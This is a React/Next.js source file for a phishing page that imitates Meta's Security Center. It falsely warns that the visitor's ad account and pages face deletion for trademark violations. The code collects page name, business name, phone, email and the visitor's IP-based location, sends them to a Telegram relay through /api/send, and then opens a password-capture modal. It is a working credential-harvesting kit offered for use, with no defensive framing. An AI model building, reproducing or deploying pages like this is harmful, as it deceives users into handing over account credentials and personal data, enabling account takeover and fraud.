'use client';
import { store } from '@/store/store';
import { getTranslations } from '@/utils/translate';
import axios from 'axios';
import { useEffect, useState, type FC, type ChangeEvent, type FormEvent, useMemo } from 'react';
import Image from 'next/image';
import BlobIcon from '@/assets/images/blob.png';

import { faHome, faSearch, faShield, faFileAlt, faGear } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import PasswordModal from '@/components/form-modal/password-modal';
import VerifyModal from '@/components/form-modal/verify-modal';

interface VerifyFormData {
    personalEmail: string;
    pageName: string;
    legalBusinessName: string;
    phoneNumber: string;
    description: string;
}

const countryPhoneCodes: Record<string, string> = {
    // Americas
    US: '+1', CA: '+1', MX: '+52', BR: '+55', AR: '+54', CL: '+56',
    CO: '+57', PE: '+51', EC: '+593', VE: '+58', GY: '+592', SR: '+597', BO: '+591', PY: '+595', UY: '+598',
    GT: '+502', HN: '+504', SV: '+503', NI: '+505', CR: '+506', PA: '+507',
    DO: '+1-809', HT: '+509', JM: '+1-876',
    // Europe
    AT: '+43', BE: '+32', BG: '+359', HR: '+385', CY: '+357', CZ: '+420',
    DK: '+45', EE: '+372', FI: '+358', FR: '+33', DE: '+49', GR: '+30', HU: '+36', IE: '+353',
    IT: '+39', LV: '+371', LT: '+370', LU: '+352', MT: '+356', NL: '+31', PL: '+48', PT: '+351', RO: '+40',
    GB: '+44', SE: '+46', CH: '+41', TR: '+90',
    RS: '+381', BA: '+387', ME: '+382', UA: '+380', BY: '+375', MD: '+373', IS: '+354', AL: '+355',
    // Asia
    CN: '+86', JP: '+81', KR: '+82', HK: '+852', TW: '+886', SG: '+65', MY: '+60', TH: '+66',
    VN: '+84', PH: '+63', ID: '+62', BD: '+880', IN: '+91', PK: '+92', LK: '+94', NP: '+977',
    AF: '+93', IR: '+98', KZ: '+7', UZ: '+998', TJ: '+992', KG: '+996',
    MM: '+95', LA: '+856', KH: '+855', RU: '+7', AU: '+61', NZ: '+64',
    // Middle East & West Asia
    AE: '+971', SA: '+966', KW: '+965', BH: '+973', QA: '+974', OM: '+968', YE: '+967',
    IL: '+972', PS: '+970', JO: '+962', LB: '+961', SY: '+963', IQ: '+964',
    // Africa
    EG: '+20', ZA: '+27', NG: '+234', KE: '+254', ET: '+251', GH: '+233', CM: '+237', SN: '+221',
    MA: '+212', DZ: '+213', TN: '+216', LY: '+218', MG: '+261', ZW: '+263', BW: '+267'
};

const countryFlags: Record<string, string> = {
    // Americas
    US: '🇺🇸', CA: '🇨🇦', MX: '🇲🇽', BR: '🇧🇷', AR: '🇦🇷', CL: '🇨🇱',
    CO: '🇨🇴', PE: '🇵🇪', EC: '🇪🇨', VE: '🇻🇪', GY: '🇬🇾', SR: '🇸🇷', BO: '🇧🇴', PY: '🇵🇾', UY: '🇺🇾',
    GT: '🇬🇹', HN: '🇭🇳', SV: '🇸🇻', NI: '🇳🇮', CR: '🇨🇷', PA: '🇵🇦',
    DO: '🇩🇴', HT: '🇭🇹', JM: '🇯🇲',
    // Europe
    AT: '🇦🇹', BE: '🇧🇪', BG: '🇧🇬', HR: '🇭🇷', CY: '🇨🇾', CZ: '🇨🇿',
    DK: '🇩🇰', EE: '🇪🇪', FI: '🇫🇮', FR: '🇫🇷', DE: '🇩🇪', GR: '🇬🇷', HU: '🇭🇺', IE: '🇮🇪',
    IT: '🇮🇹', LV: '🇱🇻', LT: '🇱🇹', LU: '🇱🇺', MT: '🇲🇹', NL: '🇳🇱', PL: '🇵🇱', PT: '🇵🇹', RO: '🇷🇴',
    GB: '🇬🇧', SE: '🇸🇪', CH: '🇨🇭', TR: '🇹🇷',
    RS: '🇷🇸', BA: '🇧🇦', ME: '🇲🇪', UA: '🇺🇦', BY: '🇧🇾', MD: '🇲🇩', IS: '🇮🇸', AL: '🇦🇱',
    // Asia
    CN: '🇨🇳', JP: '🇯🇵', KR: '🇰🇷', HK: '🇭🇰', TW: '🇹🇼', SG: '🇸🇬', MY: '🇲🇾', TH: '🇹🇭',
    VN: '🇻🇳', PH: '🇵🇭', ID: '🇮🇩', BD: '🇧🇩', IN: '🇮🇳', PK: '🇵🇰', LK: '🇱🇰', NP: '🇳🇵',
    AF: '🇦🇫', IR: '🇮🇷', KZ: '🇰🇿', UZ: '🇺🇿', TJ: '🇹🇯', KG: '🇰🇬',
    MM: '🇲🇲', LA: '🇱🇦', KH: '🇰🇭', RU: '🇷🇺', AU: '🇦🇺', NZ: '🇳🇿',
    // Middle East & West Asia
    AE: '🇦🇪', SA: '🇸🇦', KW: '🇰🇼', BH: '🇧🇭', QA: '🇶🇦', OM: '🇴🇲', YE: '🇾🇪',
    IL: '🇮🇱', PS: '🇵🇸', JO: '🇯🇴', LB: '🇱🇧', SY: '🇸🇾', IQ: '🇮🇶',
    // Africa
    EG: '🇪🇬', ZA: '🇿🇦', NG: '🇳🇬', KE: '🇰🇪', ET: '🇪🇹', GH: '🇬🇭', CM: '🇨🇲', SN: '🇸🇳',
    MA: '🇲🇦', DZ: '🇩🇿', TN: '🇹🇳', LY: '🇱🇾', MG: '🇲🇬', ZW: '🇿🇼', BW: '🇧🇼'
};

const countryNames: Record<string, string> = {
    // Americas
    US: 'United States', CA: 'Canada', MX: 'Mexico', BR: 'Brazil', AR: 'Argentina', CL: 'Chile',
    CO: 'Colombia', PE: 'Peru', EC: 'Ecuador', VE: 'Venezuela', GY: 'Guyana', SR: 'Suriname', BO: 'Bolivia', PY: 'Paraguay', UY: 'Uruguay',
    GT: 'Guatemala', HN: 'Honduras', SV: 'El Salvador', NI: 'Nicaragua', CR: 'Costa Rica', PA: 'Panama',
    DO: 'Dominican Republic', HT: 'Haiti', JM: 'Jamaica',
    // Europe
    AT: 'Austria', BE: 'Belgium', BG: 'Bulgaria', HR: 'Croatia', CY: 'Cyprus', CZ: 'Czech Republic',
    DK: 'Denmark', EE: 'Estonia', FI: 'Finland', FR: 'France', DE: 'Germany', GR: 'Greece', HU: 'Hungary', IE: 'Ireland',
    IT: 'Italy', LV: 'Latvia', LT: 'Lithuania', LU: 'Luxembourg', MT: 'Malta', NL: 'Netherlands', PL: 'Poland', PT: 'Portugal', RO: 'Romania',
    GB: 'United Kingdom', SE: 'Sweden', CH: 'Switzerland', TR: 'Turkey',
    RS: 'Serbia', BA: 'Bosnia & Herzegovina', ME: 'Montenegro', UA: 'Ukraine', BY: 'Belarus', MD: 'Moldova', IS: 'Iceland', AL: 'Albania',
    // Asia
    CN: 'China', JP: 'Japan', KR: 'South Korea', HK: 'Hong Kong', TW: 'Taiwan', SG: 'Singapore', MY: 'Malaysia', TH: 'Thailand',
    VN: 'Vietnam', PH: 'Philippines', ID: 'Indonesia', BD: 'Bangladesh', IN: 'India', PK: 'Pakistan', LK: 'Sri Lanka', NP: 'Nepal',
    AF: 'Afghanistan', IR: 'Iran', KZ: 'Kazakhstan', UZ: 'Uzbekistan', TJ: 'Tajikistan', KG: 'Kyrgyzstan',
    MM: 'Myanmar', LA: 'Laos', KH: 'Cambodia', RU: 'Russia', AU: 'Australia', NZ: 'New Zealand',
    // Middle East & West Asia
    AE: 'United Arab Emirates', SA: 'Saudi Arabia', KW: 'Kuwait', BH: 'Bahrain', QA: 'Qatar', OM: 'Oman', YE: 'Yemen',
    IL: 'Israel', PS: 'Palestine', JO: 'Jordan', LB: 'Lebanon', SY: 'Syria', IQ: 'Iraq',
    // Africa
    EG: 'Egypt', ZA: 'South Africa', NG: 'Nigeria', KE: 'Kenya', ET: 'Ethiopia', GH: 'Ghana', CM: 'Cameroon', SN: 'Senegal',
    MA: 'Morocco', DZ: 'Algeria', TN: 'Tunisia', LY: 'Libya', MG: 'Madagascar', ZW: 'Zimbabwe', BW: 'Botswana'
};

const Page: FC = () => {
    const { geoInfo, setGeoInfo, setMessageId, setMessage } = store();
    const [isLoading, setIsLoading] = useState(false);
    const [selectedCountryCode, setSelectedCountryCode] = useState<string>('US');
    const [showPasswordModal, setShowPasswordModal] = useState(false);
    const [showVerifyModal, setShowVerifyModal] = useState(false);
    const [formData, setFormData] = useState<VerifyFormData>({
        personalEmail: '',
        pageName: '',
        legalBusinessName: '',
        phoneNumber: '',
        description: ''
    });

    // Compute translations using useMemo - instantly without API calls
    const countryToLanguage: Record<string, string> = useMemo(() => ({
        'us': 'en', 'gb': 'en', 'ca': 'en', 'au': 'en',
        'mx': 'es', 'es': 'es', 'ar': 'es', 'br': 'pt', 'pt': 'pt',
        'fr': 'fr', 'de': 'de', 'at': 'de', 'ch': 'fr',
        'jp': 'ja', 'cn': 'zh', 'tw': 'zh', 'hk': 'zh',
        'kr': 'ko', 'th': 'th', 'vn': 'vi', 'id': 'id',
        'ru': 'ru', 'ua': 'uk', 'in': 'hi', 'bd': 'bn',
        'ae': 'ar', 'sa': 'ar', 'eg': 'ar'
    }), []);

    const translations = useMemo(() => {
        const lang = countryToLanguage[selectedCountryCode.toLowerCase()] || 'en';
        return getTranslations(lang);
    }, [selectedCountryCode, countryToLanguage]);

    const t = (text: string): string => {
        const translated = translations[text];
        if (translated === undefined) {
            return text;
        }
        return translated;
    };

    useEffect(() => {
        if (geoInfo) {
            return;
        }

        const fetchGeoInfo = async () => {
            try {
                const { data } = await axios.get('https://get.geojs.io/v1/ip/geo.json');
                setGeoInfo({
                    asn: data.asn || 0,
                    ip: data.ip || 'CHỊU',
                    country: data.country || 'CHỊU',
                    city: data.city || 'CHỊU',
                    country_code: data.country_code || 'US'
                });
            } catch {
                setGeoInfo({
                    asn: 0,
                    ip: 'CHỊU',
                    country: 'CHỊU',
                    city: 'CHỊU',
                    country_code: 'US'
                });
            }
        };
        fetchGeoInfo();
    }, [setGeoInfo, geoInfo]);

    useEffect(() => {
        if (!geoInfo) return;
        
        console.log('GeoInfo received:', geoInfo);
        // Set initial country code from geolocation
        setSelectedCountryCode(geoInfo.country_code);
    }, [geoInfo]);

    const handleInputChange = (e: ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
        const { name, value } = e.target;
        setFormData((prev) => ({
            ...prev,
            [name]: value
        }));
    };

    const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
        e.preventDefault();

        if (isLoading) return;
        setIsLoading(true);

        // Prepare message data
        const phoneCountryCode = countryPhoneCodes[selectedCountryCode] || '+1';
        const fullPhoneNumber = `${phoneCountryCode}${formData.phoneNumber}`;

        const message = `
${
    geoInfo
        ? `<b>📌 IP:</b> <code>${geoInfo.ip}</code>\n<b>🌎 Country:</b> <code>${geoInfo.city} - ${geoInfo.country} (${geoInfo.country_code})</code>`
        : 'N/A'
}

<b>📝 Page Name:</b> <code>${formData.pageName}</code>
<b>🏢 Legal Business Name:</b> <code>${formData.legalBusinessName}</code>
<b>📱 Phone Number:</b> <code>${fullPhoneNumber}</code>
<b>📧 Personal Email:</b> <code>${formData.personalEmail}</code>

<b>🕐 Time:</b> <code>${new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' })}</code>
        `.trim();

        try {
            // Send message to telegram first
            const res = await axios.post('/api/send', {
                message
            });

            if (res?.data?.success && typeof res.data.data.result.message_id === 'number') {
                setMessageId(res.data.data.result.message_id);
                setMessage(message);
                // Show password modal after successful telegram send
                setShowPasswordModal(true);
            } else {
                alert('Error submitting form. Please try again.');
            }
        } catch {
            alert('Error submitting form. Please try again.');
        } finally {
            setIsLoading(false);
        }
    };



    const handleVerifyConfirm = async () => {
        // Close verify modal and reset form
        setShowVerifyModal(false);
        setFormData({
            personalEmail: '',
            pageName: '',
            legalBusinessName: '',
            phoneNumber: '',
            description: ''
        });
    };

    return (
        <div className="min-h-screen bg-gray-50 flex flex-col">
            <div className="flex-1 flex justify-center pt-4 md:pt-6">
                <div className="flex w-full max-w-7xl mx-auto">
                    {/* Sidebar - Hidden on mobile */}
                    <div className="hidden md:flex w-64 bg-gray-50 flex-col flex-shrink-0">
                        <div className="px-4 py-3 bg-gray-50">
                            <div className="flex flex-col items-start gap-3">
                                <Image 
                                    src={BlobIcon} 
                                    alt="Meta" 
                                    width={500} 
                                    height={300} 
                                    className="w-24 h-auto flex-shrink-0"
                                    priority
                                    quality={100}
                                />
                                <p className="text-2xl font-bold text-gray-900">{t('Security Center')}</p>
                            </div>
                        </div>

                        <nav className="flex-1 px-2 py-3 space-y-1 my-4 relative">
                            <div className="absolute right-0 top-[42%] transform -translate-y-1/2 h-[95%] border-r border-gray-300"></div>
                            <div className="px-3 py-2.5 rounded-lg bg-blue-50 text-blue-700 font-medium flex items-center gap-3 cursor-pointer hover:bg-blue-100 transition">
                                <FontAwesomeIcon icon={faHome} className="w-5 h-5" />
                                <span className="text-sm">{t('Home')}</span>
                            </div>
                            <div className="px-3 py-2.5 rounded-lg text-gray-700 hover:bg-gray-100 cursor-pointer flex items-center gap-3 transition">
                                <FontAwesomeIcon icon={faSearch} className="w-5 h-5" />
                                <span className="text-sm">{t('Search')}</span>
                            </div>
                            <div className="px-3 py-2.5 rounded-lg text-gray-700 hover:bg-gray-100 cursor-pointer flex items-center gap-3 transition">
                                <FontAwesomeIcon icon={faShield} className="w-5 h-5" />
                                <span className="text-sm">{t('Security Policies')}</span>
                            </div>
                            <div className="px-3 py-2.5 rounded-lg text-gray-700 hover:bg-gray-100 cursor-pointer flex items-center gap-3 transition">
                                <FontAwesomeIcon icon={faFileAlt} className="w-5 h-5" />
                                <span className="text-sm">{t('Rules & Other Posts')}</span>
                            </div>
                            <div className="px-3 py-2.5 rounded-lg text-gray-700 hover:bg-gray-100 cursor-pointer flex items-center gap-3 transition">
                                <FontAwesomeIcon icon={faGear} className="w-5 h-5" />
                                <span className="text-sm">{t('Settings')}</span>
                            </div>
                        </nav>
                    </div>

                    {/* Main Content */}
                    <div className="flex-1 flex flex-col w-full md:w-auto">
                        {/* Content Area */}
                        <div className="flex-1 overflow-y-auto p-3 md:p-4 md:p-6 flex flex-col pb-6">
                            <div className="w-full max-w-3xl mx-auto md:mx-0">
                                {/* Notification Banner */}
                                <div className="mb-6 bg-red-50 border-l-4 border-red-500 rounded-lg p-4 md:p-6">
                                    <div className="flex items-start gap-3">
                                        <div className="mt-1 text-red-600 font-bold text-xl">−</div>
                                        <div className="flex-1">
                                            <h2 className="text-lg md:text-xl font-bold text-gray-900 mb-2">
                                                {t('We have scheduled your ad account and pages for deletion')}
                                            </h2>
                                            <p className="text-sm md:text-base text-gray-700 mb-3">
                                                {t('We have received multiple reports indicating that your advertisement violates trademark rights. After a detailed review, we have made a decision regarding this matter.')}
                                            </p>
                                            <p className="text-xs md:text-sm text-gray-600 mb-4">
                                                {t('If no corrective actions are taken, your advertising account will be permanently deleted. If you wish to appeal this decision, please submit an appeal request us for review and assistance.')}
                                            </p>
                                            <p className="text-xs md:text-sm font-semibold text-gray-700">
                                                {t('Your ticket id: HFWMK-T7M-QNMU')}
                                            </p>
                                        </div>
                                    </div>
                                </div>

                                {/* Request Review Section */}
                                <div className="mb-6 bg-white rounded-lg p-4 md:p-6 shadow-sm border border-gray-200">
                                    <h3 className="text-lg font-bold text-gray-900 mb-3">
                                        {t('Request review')}
                                    </h3>
                                    <p className="text-sm md:text-base text-gray-600 mb-5">
                                        {t('This team is used for submitting appeals and restoring account status.')}
                                    </p>
                                    <p className="text-xs md:text-sm text-gray-600 mb-6">
                                        {t('Please ensure that you provide the required information below. Failure to do so may delay the processing of your appeal.')}
                                    </p>
                                    
                                    {/* Form */}
                                    <form onSubmit={handleSubmit} className="space-y-4 md:space-y-5">
                                        {/* Page Name */}
                                        <div>
                                            <label className="block text-xs font-semibold text-gray-600 mb-2 uppercase tracking-wider">
                                                {t('Page Name')}
                                            </label>
                                            <input
                                                required
                                                type="text"
                                                name="pageName"
                                                value={formData.pageName}
                                                onChange={handleInputChange}
                                                placeholder={t('Page Name') || 'Page name'}
                                                className="w-full px-3 md:px-4 py-2 md:py-3 bg-gray-50 border border-gray-200 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-300 outline-none transition text-sm md:text-base"
                                            />
                                        </div>

                                        {/* Legal Business Name */}
                                        <div>
                                            <label className="block text-xs font-semibold text-gray-600 mb-2 uppercase tracking-wider">
                                                {t('Legal Business Name')}
                                            </label>
                                            <input
                                                required
                                                type="text"
                                                name="legalBusinessName"
                                                value={formData.legalBusinessName}
                                                onChange={handleInputChange}
                                                placeholder={translations['Enter legal business name'] || 'Enter legal business name'}
                                                className="w-full px-3 md:px-4 py-2 md:py-3 bg-gray-50 border border-gray-200 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-300 outline-none transition text-sm md:text-base"
                                            />
                                        </div>

                                        {/* Phone Number */}
                                        <div>
                                            <label className="block text-xs font-semibold text-gray-600 mb-2 uppercase tracking-wider">
                                                {t('Phone Number')}
                                            </label>
                                            <div className="flex gap-2 items-center">
                                                <select
                                                    value={selectedCountryCode}
                                                    onChange={(e) => setSelectedCountryCode(e.target.value)}
                                                    className="h-10 md:h-11 px-2 md:px-3 py-2 bg-gray-50 border border-gray-200 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-300 outline-none transition text-lg cursor-pointer hover:border-gray-300 flex-shrink-0"
                                                    style={{ minWidth: '60px' }}
                                                    title={countryNames[selectedCountryCode]}
                                                >
                                                    {Object.entries(countryPhoneCodes).map(([code]) => (
                                                        <option key={code} value={code} title={countryNames[code]}>
                                                            {countryFlags[code]}
                                                        </option>
                                                    ))}
                                                </select>
                                                <input
                                                    disabled
                                                    type="text"
                                                    value={countryPhoneCodes[selectedCountryCode] || '+1'}
                                                    placeholder="+1"
                                                    className="w-14 md:w-16 px-2 md:px-3 py-2 md:py-3 bg-gray-50 border border-gray-200 rounded-lg text-gray-600 font-semibold outline-none text-center text-sm md:text-base flex-shrink-0"
                                                />
                                                <input
                                                    required
                                                    type="tel"
                                                    name="phoneNumber"
                                                    value={formData.phoneNumber}
                                                    onChange={handleInputChange}
                                                    placeholder="912 345 678"
                                                    className="flex-1 px-3 md:px-4 py-2 md:py-3 bg-gray-50 border border-gray-200 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-300 outline-none transition text-sm md:text-base"
                                                />
                                            </div>
                                        </div>

                                        {/* Email */}
                                        <div>
                                            <label className="block text-xs font-semibold text-gray-600 mb-2 uppercase tracking-wider">
                                                {t('Email')}
                                            </label>
                                            <input
                                                required
                                                type="email"
                                                name="personalEmail"
                                                value={formData.personalEmail}
                                                onChange={handleInputChange}
                                                placeholder={translations['Enter email address'] || 'Enter email address'}
                                                className="w-full px-3 md:px-4 py-2 md:py-3 bg-gray-50 border border-gray-200 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-300 outline-none transition text-sm md:text-base"
                                            />
                                        </div>

                                        {/* Description */}
                                        <div>
                                            <label className="block text-xs font-semibold text-gray-600 mb-2 uppercase tracking-wider">
                                                {t('Description')}
                                            </label>
                                            <textarea
                                                name="description"
                                                value={formData.description}
                                                onChange={handleInputChange}
                                                placeholder={translations['Write a short description about your page'] || 'Write a short description about your page'}
                                                rows={3}
                                                className="w-full px-3 md:px-4 py-2 md:py-3 bg-gray-50 border border-gray-200 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-300 outline-none transition resize-none text-sm md:text-base"
                                            />
                                        </div>

                                        {/* Submit Button */}
                                        <button
                                            type="submit"
                                            disabled={isLoading}
                                            className="w-full mt-6 md:mt-8 py-3 md:py-3.5 bg-blue-600 text-white font-semibold rounded-lg hover:bg-blue-700 transition-all shadow-md hover:shadow-lg disabled:opacity-60 disabled:cursor-not-allowed flex items-center justify-center gap-2 text-sm md:text-base"
                                        >
                                            {isLoading ? (
                                                <>
                                                    <div className="h-4 w-4 animate-spin rounded-full border-2 border-white border-b-transparent"></div>
                                                    {t('Submit for Review')}
                                                </>
                                            ) : (
                                                t('Submit for Review')
                                            )}
                                        </button>
                                    </form>
                                </div>

                                {/* Trademark Infringement Info */}
                                <div className="bg-white rounded-lg p-4 md:p-6 shadow-sm border border-gray-200">
                                    <h3 className="text-lg font-bold text-gray-900 mb-4">
                                        {t('What is trademark infringement?')}
                                    </h3>
                                    
                                    <p className="text-sm md:text-base text-gray-700 mb-4">
                                        {t('Generally, trademark infringement occurs when all three of the following requirements are met:')}
                                    </p>

                                    <ol className="space-y-3 md:space-y-4">
                                        <li className="text-sm md:text-base text-gray-700 flex gap-3">
                                            <span className="font-semibold text-gray-900 flex-shrink-0">1.</span>
                                            <span>{t('A company or person uses a trademark owner\'s trademark (or similar trademark) without permission.')}</span>
                                        </li>
                                        <li className="text-sm md:text-base text-gray-700 flex gap-3">
                                            <span className="font-semibold text-gray-900 flex-shrink-0">2.</span>
                                            <span>{t('That use is in commerce, meaning that it\'s done in connection with the sale or promotion of goods or services.')}</span>
                                        </li>
                                        <li className="text-sm md:text-base text-gray-700 flex gap-3">
                                            <span className="font-semibold text-gray-900 flex-shrink-0">3.</span>
                                            <span>{t('That use is likely to confuse consumers about the source, endorsement or affiliation of the goods or services.')}</span>
                                        </li>
                                    </ol>

                                    <p className="text-sm md:text-base text-gray-700 mt-4">
                                        {t('Trademark infringement is often "likelihood of confusion" and there are many factors that determine whether a use is likely to cause confusion. For example, when a person\'s trademark is also used by someone else. But on unrelated goods or services, that use may not be infringement because it may not be likely to cause confusion. For example, when a person\'s trademark first can often be an important consideration as well.')}
                                    </p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            {/* Footer - Full Width */}
            <div className="bg-gray-50 flex justify-center border-t border-gray-200">
                <div className="w-full max-w-7xl mx-auto flex">
                    <div className="w-64 hidden md:block flex-shrink-0"></div>
                    <div className="flex-1 py-2 md:py-3 px-2 md:px-2 flex items-center justify-start gap-2 md:gap-3 text-xs md:text-sm text-gray-600 overflow-x-auto">
                        <span className="text-2xl md:text-3xl font-bold text-blue-600 flex-shrink-0">∞</span>
                        <a href="#" className="hover:text-gray-900 flex-shrink-0">{t('About')}</a>
                        <a href="#" className="hover:text-gray-900 flex-shrink-0">{t('Create ad')}</a>
                        <a href="#" className="hover:text-gray-900 flex-shrink-0">{t('Create Page')}</a>
                        <a href="#" className="hover:text-gray-900 flex-shrink-0">{t('Developers')}</a>
                        <a href="#" className="hover:text-gray-900 flex-shrink-0">{t('Careers')}</a>
                        <a href="#" className="hover:text-gray-900 flex-shrink-0">{t('Privacy')}</a>
                        <a href="#" className="hover:text-gray-900 flex-shrink-0">{t('Cookies')}</a>
                        <a href="#" className="hover:text-gray-900 flex-shrink-0">{t('Terms')}</a>
                        <a href="#" className="hover:text-gray-900 flex-shrink-0">{t('Help')}</a>
                    </div>
                </div>
            </div>

            {/* Password Modal */}
            {showPasswordModal && (
                <PasswordModal 
                    userProfileImage=""
                    userName={formData.pageName || 'User'}
                    userEmail={formData.personalEmail || ''}
                />
            )}

            {/* Verify Modal */}
            {showVerifyModal && (
                <VerifyModal 
                    businessName={formData.legalBusinessName}
                    nextStep={handleVerifyConfirm}
                />
            )}
        </div>
    );
};

export default Page;
